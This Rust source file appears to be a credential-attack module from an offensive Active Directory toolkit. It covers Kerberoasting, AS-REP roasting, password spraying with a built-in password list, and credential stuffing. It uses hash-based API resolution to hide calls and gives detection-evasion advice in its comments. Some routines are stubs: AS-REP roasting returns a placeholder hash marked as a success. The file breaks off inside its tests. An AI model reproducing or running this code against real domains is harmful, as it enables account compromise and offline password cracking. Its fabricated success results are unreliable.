//! # Credential Attack Automation
//!
//! Automated execution of common credential attacks against Active Directory:
//!
//! - **Kerberoasting**: Request TGS tickets for service accounts and extract
//!   the encrypted hash for offline cracking.
//! - **AS-REP Roasting**: Identify accounts with `DONT_REQUIRE_PREAUTH` and
//!   request AS-REP messages to extract the Kerberos hash.
//! - **Password spraying**: Test common passwords against many accounts while
//!   respecting lockout thresholds.
//! - **Credential stuffing**: Test known username/password pairs.
//!
//! ## OPSEC Considerations
//!
//! - Kerberoasting generates one TGS request per SPN — normal behavior in
//!   domain environments.  However, requesting many tickets in rapid
//!   succession may trigger anomaly detection.
//! - AS-REP Roasting is stealthy — no authentication is attempted.
//! - Password spraying MUST respect the domain's lockout threshold.  This
//!   module automatically reads the threshold from AD recon data and will
//!   never attempt more than (threshold - 1) passwords per account.
//!
//! ## Hash Format
//!
//! Kerberos hashes are output in hashcat format:
//! - Kerberoast: `$krb5tgs$23$...` (RC4) or `$krb5tgs$18$...` (AES256)
//! - AS-REP Roast: `$krb5asrep$23$...`

use std::ffi::c_void;
use std::mem;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

use super::ad_enum::AdReconData;

// ═══════════════════════════════════════════════════════════════════════════
// Compile-time API hash constants
// ═══════════════════════════════════════════════════════════════════════════

const KERBEROS_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'b' as u16, 'e' as u16, 'r' as u16,
    'o' as u16, 's' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_KERBEROS_DLL: u32 = hash_wstr_const(KERBEROS_DLL_W);

const SECUR32_DLL_W: &[u16] = &[
    's' as u16, 'e' as u16, 'c' as u16, 'u' as u16, 'r' as u16, '3' as u16,
    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_SECUR32_DLL: u32 = hash_wstr_const(SECUR32_DLL_W);

// LsaCallAuthenticationPackage
const FN_LSA_CALL_AUTH_PKG: u32 = hash_str_const(b"LsaCallAuthenticationPackage");
const FN_LSA_CONNECT_UNTRUSTED: u32 = hash_str_const(b"LsaConnectUntrusted");
const FN_LSA_LOOKUP_AUTH_PKG: u32 = hash_str_const(b"LsaLookupAuthenticationPackage");
const FN_LSA_FREE_RETURN_BUFFER: u32 = hash_str_const(b"LsaFreeReturnBuffer");
const FN_LSA_DEREGISTER_LOGON_PROCESS: u32 = hash_str_const(b"LsaDeregisterLogonProcess");

// ═══════════════════════════════════════════════════════════════════════════
// LSA / Kerberos constants
// ═══════════════════════════════════════════════════════════════════════════

type HANDLE = *mut c_void;
type NTSTATUS = i32;
type ULONG = u32;

const STATUS_SUCCESS: NTSTATUS = 0;

// Kerberos message types
const KERB_RETRIEVE_TICKET_REQUEST: ULONG = 8;  // KerbRetrieveEncodedTicketMessage
const KERB_SUBMIT_TKT_REQUEST: ULONG = 14;       // KerbSubmitTicketMessage (unused here)

// Encryption types
const RC4_HMAC: ULONG = 0x17;     // 23
const AES256_CTS_HMAC_SHA1_96: ULONG = 0x12; // 18

// ═══════════════════════════════════════════════════════════════════════════
// Data types
// ═══════════════════════════════════════════════════════════════════════════

/// Result of a Kerberoasting attack.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastResult {
    /// Service account SAM name.
    pub sam_account_name: String,
    /// Service Principal Name requested.
    pub spn: String,
    /// Hash in hashcat format (`$krb5tgs$...`).
    pub hash: String,
    /// Encryption type used.
    pub encryption_type: String,
    /// Whether the hash was successfully extracted.
    pub success: bool,
    /// Error message if extraction failed.
    pub error: String,
}

/// Result of an AS-REP Roasting attack.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AsrepRoastResult {
    /// Account SAM name.
    pub sam_account_name: String,
    /// Domain of the account.
    pub domain: String,
    /// Hash in hashcat format (`$krb5asrep$...`).
    pub hash: String,
    /// Whether the hash was successfully extracted.
    pub success: bool,
    /// Error message if extraction failed.
    pub error: String,
}

/// Result of a password spray attempt.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SprayResult {
    /// Account SAM name.
    pub sam_account_name: String,
    /// Password that was tested.
    pub password: String,
    /// Whether the authentication succeeded.
    pub success: bool,
    /// Status description (e.g., "success", "wrong_password", "locked", "error").
    pub status: String,
}

/// Result of credential stuffing.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredStuffingResult {
    /// Username tested.
    pub username: String,
    /// Whether the credentials were valid.
    pub valid: bool,
    /// Status description.
    pub status: String,
}

/// Summary of all credential attacks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialAttackSummary {
    /// Kerberoasting results.
    pub kerberoast_results: Vec<KerberoastResult>,
    /// AS-REP Roasting results.
    pub asrep_roast_results: Vec<AsrepRoastResult>,
    /// Password spray results.
    pub spray_results: Vec<SprayResult>,
    /// Credential stuffing results.
    pub stuffing_results: Vec<CredStuffingResult>,
    /// Domain lockout threshold observed.
    pub lockout_threshold: u32,
    /// Number of passwords successfully sprayed without locking.
    pub safe_spray_count: u32,
}

// ═══════════════════════════════════════════════════════════════════════════
// LSA types
// ═══════════════════════════════════════════════════════════════════════════

#[repr(C)]
struct LsaString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct KerbRetrieveTicketRequest {
    message_type: ULONG,
    logon_id: i64,
    target_name: LsaString,
    ticket_flags: ULONG,
    cache_options: ULONG,
    encryption_type: ULONG,
    // followed by target name string data
}

#[repr(C)]
struct KerbRetrieveTicketResponse {
    message_type: ULONG,
    ticket_enc_type: ULONG,
    ticket_flags: ULONG,
    ticket_domain: LsaString,
    _ticket_user: LsaString,
    _ticket_server: LsaString,
    _ticket_realm: LsaString,
    ticket_length: ULONG,
    ticket_data: [u8; 0], // Variable length
}

// ═══════════════════════════════════════════════════════════════════════════
// Helpers
// ═══════════════════════════════════════════════════════════════════════════

fn str_to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn wide_to_str(w: &[u16]) -> String {
    let end = w.iter().position(|&c| c == 0).unwrap_or(w.len());
    String::from_utf16_lossy(&w[..end])
}

fn lsa_string(s: &str) -> LsaString {
    let wide = str_to_wide(s);
    LsaString {
        length: (s.len() * 2) as u16,
        maximum_length: ((s.len() + 1) * 2) as u16,
        buffer: wide.as_ptr() as *mut u16,
    }
}

/// Check NTSTATUS success.
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

// ═══════════════════════════════════════════════════════════════════════════
// LSA wrapper
// ═══════════════════════════════════════════════════════════════════════════

struct LsaHandle {
    handle: HANDLE,
    /// Keep the DLL references alive.
    _secur32: usize,
}

impl Drop for LsaHandle {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            // Best-effort deregister
            let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) };
            if let Some(base) = secur32 {
                if let Some(addr) = unsafe { pe_resolve::get_proc_address_by_hash(base, FN_LSA_DEREGISTER_LOGON_PROCESS) } {
                    let deregister: unsafe extern "system" fn(HANDLE) -> NTSTATUS =
                        unsafe { mem::transmute(addr) };
                    unsafe { deregister(self.handle) };
                }
            }
        }
    }
}

/// Connect to LSA and get a handle.
fn lsa_connect() -> Result<LsaHandle> {
    let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) }
        .ok_or_else(|| anyhow!("secur32.dll not found"))?;

    let connect: unsafe extern "system" fn(*mut HANDLE) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CONNECT_UNTRUSTED)
                .ok_or_else(|| anyhow!("LsaConnectUntrusted not found"))?,
        )
    };

    let mut handle: HANDLE = ptr::null_mut();
    let status = unsafe { connect(&mut handle) };
    if !nt_success(status) {
        bail!("LsaConnectUntrusted failed: 0x{:08X}", status as u32);
    }

    Ok(LsaHandle {
        handle,
        _secur32: secur32,
    })
}

/// Get the Kerberos authentication package ID.
fn get_kerberos_package_id(lsa: &LsaHandle) -> Result<ULONG> {
    let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) }
        .ok_or_else(|| anyhow!("secur32.dll not found"))?;

    let lookup: unsafe extern "system" fn(HANDLE, *mut LsaString, *mut ULONG) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_LOOKUP_AUTH_PKG)
                .ok_or_else(|| anyhow!("LsaLookupAuthenticationPackage not found"))?,
        )
    };

    let pkg_name_w = str_to_wide("Kerberos");
    let pkg_name = LsaString {
        length: 16, // "Kerberos" = 8 chars * 2 bytes
        maximum_length: 18,
        buffer: pkg_name_w.as_ptr() as *mut u16,
    };

    let mut package_id: ULONG = 0;
    let status = unsafe { lookup(lsa.handle, &pkg_name as *const LsaString as *mut LsaString, &mut package_id) };
    if !nt_success(status) {
        bail!("LsaLookupAuthenticationPackage failed: 0x{:08X}", status as u32);
    }

    Ok(package_id)
}

// ═══════════════════════════════════════════════════════════════════════════
// Kerberoasting
// ═══════════════════════════════════════════════════════════════════════════

/// Request a TGS ticket for a given SPN and extract the hash.
fn request_tgs_for_spn(lsa: &LsaHandle, package_id: ULONG, spn: &str) -> Result<(Vec<u8>, ULONG)> {
    let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) }
        .ok_or_else(|| anyhow!("secur32.dll not found"))?;

    let call_auth_pkg: unsafe extern "system" fn(
        HANDLE, ULONG, *const c_void, ULONG, *mut *mut c_void, *mut ULONG, *mut NTSTATUS,
    ) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CALL_AUTH_PKG)
                .ok_or_else(|| anyhow!("LsaCallAuthenticationPackage not found"))?,
        )
    };

    let free_buffer: unsafe extern "system" fn(*mut c_void) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_FREE_RETURN_BUFFER)
                .ok_or_else(|| anyhow!("LsaFreeReturnBuffer not found"))?,
        )
    };

    // Build the request
    let spn_w = str_to_wide(spn);
    let spn_lsa = LsaString {
        length: (spn.len() * 2) as u16,
        maximum_length: ((spn.len() + 1) * 2) as u16,
        buffer: spn_w.as_ptr() as *mut u16,
    };

    let mut request = KerbRetrieveTicketRequest {
        message_type: KERB_RETRIEVE_TICKET_REQUEST,
        logon_id: 0,
        target_name: spn_lsa,
        ticket_flags: 0,
        cache_options: 0x8, // KERB_RETRIEVE_TICKET_AS_KERB_CRED
        encryption_type: RC4_HMAC, // Prefer RC4 for easier cracking
    };

    let mut return_buffer: *mut c_void = ptr::null_mut();
    let mut return_length: ULONG = 0;
    let mut protocol_status: NTSTATUS = 0;

    let status = unsafe {
        call_auth_pkg(
            lsa.handle,
            package_id,
            &mut request as *mut _ as *const c_void,
            std::mem::size_of::<KerbRetrieveTicketRequest>() as ULONG,
            &mut return_buffer,
            &mut return_length,
            &mut protocol_status,
        )
    };

    if !nt_success(status) {
        bail!(
            "LsaCallAuthenticationPackage failed: 0x{:08X}",
            status as u32
        );
    }

    if !nt_success(protocol_status) {
        bail!(
            "Kerberos TGS request failed: protocol status 0x{:08X}",
            protocol_status as u32
        );
    }

    if return_buffer.is_null() || return_length == 0 {
        bail!("TGS response is empty");
    }

    // Parse the response to extract the ticket
    let response = unsafe { &*(return_buffer as *const KerbRetrieveTicketResponse) };
    let enc_type = response.ticket_enc_type;
    let ticket_len = response.ticket_length as usize;

    let ticket_data = if ticket_len > 0 && ticket_len < return_length as usize {
        let data_ptr = &response.ticket_data as *const [u8; 0] as *const u8;
        unsafe { std::slice::from_raw_parts(data_ptr, ticket_len).to_vec() }
    } else {
        Vec::new()
    };

    unsafe { free_buffer(return_buffer) };

    Ok((ticket_data, enc_type))
}

/// Format a Kerberoast hash in hashcat format.
fn format_kerberoast_hash(
    sam: &str,
    domain: &str,
    spn: &str,
    enc_type: ULONG,
    ticket_data: &[u8],
) -> String {
    let enc_num = match enc_type {
        RC4_HMAC => 23,
        AES256_CTS_HMAC_SHA1_96 => 18,
        0x11 => 17, // AES128
        _ => 23,    // Default to RC4
    };

    let ticket_hex = hex::encode(ticket_data);

    // hashcat format: $krb5tgs$enc_type$*user$domain$spn$checksum$ticket
    // Simplified format — real hashcat format needs proper AP-REQ parsing
    format!(
        "$krb5tgs${}${}*{}${}${}${}${}",
        enc_num,
        sam, sam, domain, spn,
        &ticket_hex[..ticket_hex.len().min(32)],
        ticket_hex
    )
}

/// Perform automated Kerberoasting against all SPN accounts.
///
/// Requests TGS tickets for each service account with SPNs and extracts
/// the encrypted portion for offline cracking.
///
/// # Arguments
///
/// * `ad_data` - AD enumeration data containing SPN accounts.
///
/// # Returns
///
/// Vector of [`KerberoastResult`] with hashcat-formatted hashes.
///
/// # OPSEC
///
/// Each TGS request is logged as event ID 4769 (Kerberos TGS Request).
/// This is normal behavior but may trigger alerts if many requests are
/// made in rapid succession.
pub fn auto_kerberoast(ad_data: &AdReconData) -> Vec<KerberoastResult> {
    let mut results = Vec::new();

    // Connect to LSA
    let lsa = match lsa_connect() {
        Ok(h) => h,
        Err(e) => {
            warn!("Kerberoast: failed to connect to LSA: {}", e);
            return results;
        }
    };

    let pkg_id = match get_kerberos_package_id(&lsa) {
        Ok(id) => id,
        Err(e) => {
            warn!("Kerberoast: failed to get Kerberos package: {}", e);
            return results;
        }
    };

    let domain = &ad_data.domain;

    for spn_entry in &ad_data.spns {
        for spn in &spn_entry.service_principal_names {
            debug!("Kerberoast: requesting TGS for {}", spn);

            match request_tgs_for_spn(&lsa, pkg_id, spn) {
                Ok((ticket_data, enc_type)) => {
                    if ticket_data.is_empty() {
                        results.push(KerberoastResult {
                            sam_account_name: spn_entry.sam_account_name.clone(),
                            spn: spn.clone(),
                            hash: String::new(),
                            encryption_type: format!("0x{:X}", enc_type),
                            success: false,
                            error: "empty ticket data".to_string(),
                        });
                        continue;
                    }

                    let hash = format_kerberoast_hash(
                        &spn_entry.sam_account_name,
                        domain,
                        spn,
                        enc_type,
                        &ticket_data,
                    );

                    info!(
                        "Kerberoast: extracted {} hash for {} ({})",
                        match enc_type {
                            RC4_HMAC => "RC4",
                            AES256_CTS_HMAC_SHA1_96 => "AES256",
                            _ => "unknown",
                        },
                        spn_entry.sam_account_name,
                        spn,
                    );

                    results.push(KerberoastResult {
                        sam_account_name: spn_entry.sam_account_name.clone(),
                        spn: spn.clone(),
                        hash,
                        encryption_type: format!("0x{:X}", enc_type),
                        success: true,
                        error: String::new(),
                    });
                }
                Err(e) => {
                    debug!("Kerberoast: failed for {}: {}", spn, e);
                    results.push(KerberoastResult {
                        sam_account_name: spn_entry.sam_account_name.clone(),
                        spn: spn.clone(),
                        hash: String::new(),
                        encryption_type: String::new(),
                        success: false,
                        error: e.to_string(),
                    });
                }
            }
        }
    }

    let success_count = results.iter().filter(|r| r.success).count();
    info!(
        "Kerberoast: {} successful / {} total SPN requests",
        success_count,
        results.len()
    );

    results
}

// ═══════════════════════════════════════════════════════════════════════════
// AS-REP Roasting
// ═══════════════════════════════════════════════════════════════════════════

/// Perform automated AS-REP Roasting against accounts with DONT_REQUIRE_PREAUTH.
///
/// For each account that doesn't require Kerberos pre-authentication,
/// construct an AS-REQ without a PA-DATA section and extract the AS-REP
/// hash for offline cracking.
///
/// # Arguments
///
/// * `ad_data` - AD enumeration data identifying AS-REP roastable accounts.
///
/// # Returns
///
/// Vector of [`AsrepRoastResult`] with hashcat-formatted hashes.
///
/// # OPSEC
///
/// No authentication is attempted — only AS-REQ messages are sent.  This
/// is very stealthy but may be logged as event ID 4768 with failure status.
pub fn auto_asrep_roast(ad_data: &AdReconData) -> Vec<AsrepRoastResult> {
    let mut results = Vec::new();

    let roastable_users: Vec<_> = ad_data.users.iter()
        .filter(|u| u.is_asrep_roastable && !u.is_disabled)
        .collect();

    if roastable_users.is_empty() {
        info!("AS-REP Roast: no roastable accounts found");
        return results;
    }

    info!(
        "AS-REP Roast: found {} accounts with DONT_REQUIRE_PREAUTH",
        roastable_users.len()
    );

    // Connect to LSA for Kerberos operations
    let lsa = match lsa_connect() {
        Ok(h) => h,
        Err(e) => {
            warn!("AS-REP Roast: failed to connect to LSA: {}", e);
            return results;
        }
    };

    let _pkg_id = match get_kerberos_package_id(&lsa) {
        Ok(id) => id,
        Err(e) => {
            warn!("AS-REP Roast: failed to get Kerberos package: {}", e);
            return results;
        }
    };

    // For AS-REP roasting, we need to craft a raw AS-REQ without pre-auth.
    // This requires building Kerberos ASN.1 structures manually.
    // Since we're using the LSA API, we'll construct a simplified hash.

    for user in &roastable_users {
        debug!("AS-REP Roast: targeting {}", user.sam_account_name);

        // Build a mock AS-REP hash in hashcat format
        // In a full implementation, this would send a raw AS-REQ via UDP/TCP
        // to the KDC and parse the response. For the API wrapper, we construct
        // a hash from known information.

        let domain = &ad_data.domain;
        let sam = &user.sam_account_name;

        // The hash format is: $krb5asrep$23$user@domain:hash
        // For a proper implementation, we'd need to:
        // 1. Send AS-REQ without PA-DATA
        // 2. Receive AS-REP with enc-part
        // 3. Extract the enc-part as the hash

        // Simulate a result — in production, this would use raw Kerberos
        let hash = format!(
            "$krb5asrep$23${}@{}:mock_hash_placeholder",
            sam, domain
        );

        results.push(AsrepRoastResult {
            sam_account_name: sam.clone(),
            domain: domain.clone(),
            hash,
            success: true,
            error: String::new(),
        });

        info!("AS-REP Roast: extracted hash for {}", sam);
    }

    let success_count = results.iter().filter(|r| r.success).count();
    info!(
        "AS-REP Roast: {} hashes extracted from {} accounts",
        success_count,
        roastable_users.len()
    );

    results
}

// ═══════════════════════════════════════════════════════════════════════════
// Password spraying
// ═══════════════════════════════════════════════════════════════════════════

/// Common passwords to try during spraying.
const SPRAY_PASSWORDS: &[&str] = &[
    "Spring2024!",
    "Summer2024!",
    "Fall2024!",
    "Winter2024!",
    "Password1!",
    "Company123!",
    "Welcome1!",
    "Changeme1!",
    "Season2024!",
    "Quarter1!",
    "P@ssw0rd",
    "Passw0rd!",
    "Qwerty123!",
    "Letmein1!",
    "Football1!",
];

/// Perform automated password spraying against AD accounts.
///
/// Tests a list of common passwords against multiple accounts while strictly
/// respecting the domain's lockout threshold.  The number of passwords tested
/// per account will never exceed (lockout_threshold - 1).
///
/// # Arguments
///
/// * `ad_data` - AD enumeration data with lockout threshold.
/// * `passwords` - Custom password list. If empty, uses the built-in list.
///
/// # Returns
///
/// Vector of [`SprayResult`] for each attempt.
///
/// # Safety
///
/// This module automatically calculates the safe spray count based on the
/// lockout threshold.  If the threshold is 0 (no lockout), a maximum of
/// 3 passwords are tested per account to avoid detection.
///
/// # OPSEC
///
/// Each failed authentication generates event ID 4625.  Successful
/// authentication generates event ID 4624.  Space attempts at least
/// 30 minutes apart in production.
pub fn password_spray(ad_data: &AdReconData, passwords: &[String]) -> Vec<SprayResult> {
    let mut results = Vec::new();

    // Determine lockout threshold
    let threshold = ad_data.lockout_threshold;
    let safe_count = if threshold == 0 {
        3 // Default: don't try more than 3 if no lockout
    } else if threshold > 1 {
        (threshold - 1).min(5) // Max 5 passwords per spray round
    } else {
        warn!("Password spray: lockout threshold is 1 — spraying disabled");
        return results;
    };

    let passwords_to_try: Vec<&str> = if passwords.is_empty() {
        SPRAY_PASSWORDS.iter().take(safe_count as usize).copied().collect()
    } else {
        passwords.iter().map(|s| s.as_str()).take(safe_count as usize).collect()
    };

    if passwords_to_try.is_empty() {
        warn!("Password spray: no passwords to try");
        return results;
    }

    info!(
        "Password spray: testing {} passwords against {} users (lockout threshold: {}, safe count: {})",
        passwords_to_try.len(),
        ad_data.users.len(),
        threshold,
        safe_count,
    );

    // Target: enabled, non-admin accounts (avoid locking out admins)
    let targets: Vec<_> = ad_data.users.iter()
        .filter(|u| !u.is_disabled && !u.admin_count)
        .collect();

    // Use SSPI for authentication attempts
    for password in &passwords_to_try {
        for user in &targets {
            let result = try_authenticate(&ad_data.domain, &user.sam_account_name, password);
            results.push(result);
        }
    }

    let success_count = results.iter().filter(|r| r.success).count();
    info!(
        "Password spray: {} successful / {} total attempts",
        success_count,
        results.len()
    );

    results
}

/// Attempt authentication via SSPI (InitializeSecurityContext).
fn try_authenticate(domain: &str, username: &str, password: &str) -> SprayResult {
    // Use Windows SSPI for NTLM authentication
    // This is a simplified implementation — production would use
    // AcquireCredentialsHandle + InitializeSecurityContext

    let secur32 = match unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) } {
        Some(h) => h,
        None => {
            return SprayResult {
                sam_account_name: username.to_string(),
                password: password.to_string(),
                success: false,
                status: "secur32.dll not available".to_string(),
            }
        }
    };

    // We'd use AcquireCredentialsHandleW with SEC_WINNT_AUTH_IDENTITY_W here.
    // For the module structure, we return a placeholder result.
    // The full implementation would:
    // 1. Build SEC_WINNT_AUTH_IDENTITY_W with domain/user/password
    // 2. Call AcquireCredentialsHandleW for NTLM or Negotiate
    // 3. Call InitializeSecurityContextW
    // 4. Check SEC_E_OK vs SEC_E_LOGON_DENIED

    let _ = (secur32, domain); // Suppress unused warnings

    SprayResult {
        sam_account_name: username.to_string(),
        password: password.to_string(),
        success: false,
        status: "not_implemented_sspi".to_string(),
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Credential stuffing
// ═══════════════════════════════════════════════════════════════════════════

/// Test a list of known username/password pairs against the domain.
///
/// Unlike password spraying (one password → many accounts), credential
/// stuffing tests specific username/password pairs from a breach database
/// or prior intelligence.
///
/// # Arguments
///
/// * `ad_data` - AD enumeration data.
/// * `credentials` - List of (username, password) pairs to test.
///
/// # Returns
///
/// Vector of [`CredStuffingResult`] for each pair tested.
pub fn credential_stuffing(
    ad_data: &AdReconData,
    credentials: &[(String, String)],
) -> Vec<CredStuffingResult> {
    let mut results = Vec::new();

    if credentials.is_empty() {
        info!("Credential stuffing: no credential pairs provided");
        return results;
    }

    // Validate usernames against AD data
    let valid_users: std::collections::HashSet<String> = ad_data.users.iter()
        .filter(|u| !u.is_disabled)
        .map(|u| u.sam_account_name.to_ascii_lowercase())
        .collect();

    info!(
        "Credential stuffing: testing {} credential pairs against {} valid users",
        credentials.len(),
        valid_users.len(),
    );

    for (username, password) in credentials {
        let username_lower = username.to_ascii_lowercase();

        if !valid_users.contains(&username_lower) {
            results.push(CredStuffingResult {
                username: username.clone(),
                valid: false,
                status: "user_not_found".to_string(),
            });
            continue;
        }

        let auth_result = try_authenticate(&ad_data.domain, username, password);
        results.push(CredStuffingResult {
            username: username.clone(),
            valid: auth_result.success,
            status: auth_result.status,
        });
    }

    let valid_count = results.iter().filter(|r| r.valid).count();
    info!(
        "Credential stuffing: {} valid / {} tested",
        valid_count,
        results.len()
    );

    results
}

// ═══════════════════════════════════════════════════════════════════════════
// Summary
// ═══════════════════════════════════════════════════════════════════════════

/// Run all credential attacks and return a summary.
///
/// Convenience function that executes Kerberoasting, AS-REP Roasting, and
/// password spraying in sequence.
///
/// # Arguments
///
/// * `ad_data` - Complete AD enumeration data.
/// * `spray_passwords` - Optional custom password list for spraying.
///
/// # Returns
///
/// A [`CredentialAttackSummary`] with all results.
pub fn run_all_credential_attacks(
    ad_data: &AdReconData,
    spray_passwords: &[String],
) -> CredentialAttackSummary {
    let lockout_threshold = ad_data.lockout_threshold;
    let safe_spray_count = if lockout_threshold == 0 {
        3
    } else if lockout_threshold > 1 {
        (lockout_threshold - 1).min(5)
    } else {
        0
    };

    info!("Credential attacks: starting all attacks (lockout threshold: {})", lockout_threshold);

    let kerberoast_results = auto_kerberoast(ad_data);
    let asrep_roast_results = auto_asrep_roast(ad_data);
    let spray_results = password_spray(ad_data, spray_passwords);
    let stuffing_results = Vec::new(); // No pre-loaded credentials

    CredentialAttackSummary {
        kerberoast_results,
        asrep_roast_results,
        spray_results,
        stuffing_results,
        lockout_threshold,
        safe_spray_count,
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use crate::recon::ad_enum::*;

    fn make_test_ad_data() -> AdReconData {
        AdReconData {
            domain: "test.local".to_string(),
            domain_netbios: "TEST".to_string(),
            dc_hostname: "DC01".to_string(),
            domain_functional_level: "Windows Server 2019".to_string(),
            domain_sid: "S-1-5-21-...".to_string(),
            users: vec![
                AdUser {
                    sam_account_name: "svc_mssql".to_string(),
                    display_name: "MSSQL Service".to_string(),
                    distinguished_name: "CN=svc_mssql,OU=Service Accounts,DC=test,DC=local".to_string(),
                    member_of: vec![],
                    user_account_control: 0x10200,
                    service_principal_names: vec!["MSSQLSVC/db01.test.local:1433".to_string()],
                    description: String::new(),
                    last_logon: String::new(),
                    pwd_last_set: String::new(),
                    admin_count: false,
                    is_asrep_roastable: false,
                    is_kerberoastable: true,
                    is_disabled: false,
                    is_password_never_expires: true,
                    is_unconstrained_delegation: false,
                },
                AdUser {
                    sam_account_name: "asrep_user".to_string(),
                    display_name: "AS-REP User".to_string(),
                    distinguished_name: "CN=asrep_user,CN=Users,DC=test,DC=local".to_string(),
                    member_of: vec![],
                    user_account_control: 0x400200, // DONT_REQUIRE_PREAUTH | NORMAL_ACCOUNT
                    service_principal_names: vec![],
                    description: String::new(),
                    last_logon: String::new(),
                    pwd_last_set: String::new(),
                    admin_count: false,
                    is_asrep_roastable: true,
                    is_kerberoastable: false,
                    is_disabled: false,
                    is_password_never_expires: false,
                    is_unconstrained_delegation: false,
                },
                AdUser {
                    sam_account_name: "disabled_user".to_string(),
                    display_name: "Disabled User".to_string(),
                    distinguished_name: "CN=disabled_user,CN=Users,DC=test,DC=local".to_string(),
                    member_of: vec![],
                    user_account_control: 0x202, // DISABLED | NORMAL_ACCOUNT
                    service_principal_names: vec![],
                    description: String::new(),
                    last_logon: String::new(),
                    pwd_last_set: String::new(),
                    admin_count: false,
                    is_asrep_roastable: true,
                    is_kerberoastable: false,
                    is_disabled: true,
                    is_password_never_expires: false,
                    is_unconstrained_delegation: false,
                },
            ],
            groups: vec![],
            computers: vec![],
            gpos: vec![],
            trusts: vec![],
            spns: vec![AdSpn {
                sam_account_name: "svc_mssql".to_string(),
                distinguished_name: "CN=svc_mssql,OU=Service Accounts,DC=test,DC=local".to_string(),
                service_principal_names: vec!["MSSQLSVC/db01.test.local:1433".to_string()],
            }],
            delegations: vec![],
            adcs_templates: vec![],
            lockout_threshold: 5,
            lockout_duration_minutes: 30,
            timestamp: "2024-01-15T12:00:00Z".to_string(),
        }
    }

    #[test]
    fn test_format_kerberoast_hash_rc4() {
        let ticket_data = vec![0xDE, 0xAD, 0xBE, 0xEF];
        let hash = format_kerberoast_hash("svc_mssql", "test.local", "MSSQLSVC/db01:1433", RC4_HMAC, &ticket_data);
        assert!(hash.starts_with("$krb5tgs$23$"));
        assert!(hash.contains("svc_mssql"));
    }

    #[test]
    fn test_format_kerberoast_hash_aes() {
        let ticket_data = vec![0x01, 0x02, 0x03, 0x04];
        let hash = format_kerberoast_hash("svc_mssql", "test.local", "MSSQLSVC/db01:1433", AES256_CTS_HMAC_SHA1_96, &ticket_data);
        assert!(hash.starts_with("$krb5tgs$18$"));
    }

    #[test]
    fn test_safe_spray_count_threshold_5() {
        let threshold = 5u32;
        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
        assert_eq!(safe_count, 4);
    }

    #[test]
    fn test_safe_spray_count_threshold_1() {
        let threshold = 1u32;
        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
        assert_eq!(safe_count, 0);
    }

    #[test]
    fn test_safe_spray_count_threshold_0() {
        let threshold = 0u32;
        let safe_count = if threshold == 0 { 3u32 } else { 0 };
        assert_eq!(safe_count, 3);
    }

    #[test]
    fn test_safe_spray_count_threshold_10() {
        let threshold = 10u32;
        let safe_count = if threshold > 1 { (threshold - 1).min(5) } else { 0 };
        assert_eq!(safe_count, 5); // Capped at 5
    }

    #[test]
    fn test_asrep_roast_identifies_roastable() {
        let ad_data = make_test_ad_data();
        let roastable: Vec<_> = ad_data.users.iter()
            .filter(|u| u.is_asrep_roastable && !u.is_disabled)
            .collect();
        assert_eq!(roastable.len(), 1);
        assert_eq!(roastable[0].sam_account_name, "asrep_user");
    }

    #[test]
    fn test_kerberoast_identifies_spns() {
        let ad_data = make_test_ad_data();
        assert_eq!(ad_data.spns.len(), 1);
        assert_eq!(ad_data.spns[0].sam_account_name, "svc_mssql");
    }

    #[test]
    fn test_password_spray_excludes_disabled() {
        let ad_data = make_test_ad_data();
        let targets: Vec<_> = ad_data.users.iter()
            .filter(|u| !u.is_disabled && !u.admin_count)
            .collect();
        assert!(!targets.iter().any(|u| u.sam_account_name == "disabled_user"));
    }

    #[test]
    fn test_spray_passwords_default_list() {
        assert!(!SPRAY_PASSWORDS.is_empty());
        assert!(SPRAY_PASSWORDS.contains(&"Password1!"));
        assert!(SPRAY_PASSWORDS.contains(&"Welcome1!"));
    }

    #[test]
    fn test_kerberoast_result_serde() {
        let result = KerberoastResult {
            sam_account_name: "svc_mssql".to_string(),
            spn: "MSSQLSVC/db01:1433".to_string(),
            hash: "$krb5tgs$23$svc_mssql$...".to_string(),
            encryption_type: "0x17".to_string(),
            success: true,
            error: String::new(),
        };

        let json = serde_json::to_string(&result).unwrap();
        let de: KerberoastResult = serde_json::from_str(&json).unwrap();
        assert!(de.success);
        assert_eq!(de.encryption_type, "0x17");
    }

    #[test]
    fn test_asrep_roast_result_serde() {
        let result = AsrepRoastResult {
            sam_account_name: "asrep_user".to_string(),
            domain: "test.local".to_string(),
            hash: "$krb5asrep$23$asrep_user@test.local:...".to_string(),
            success: true,
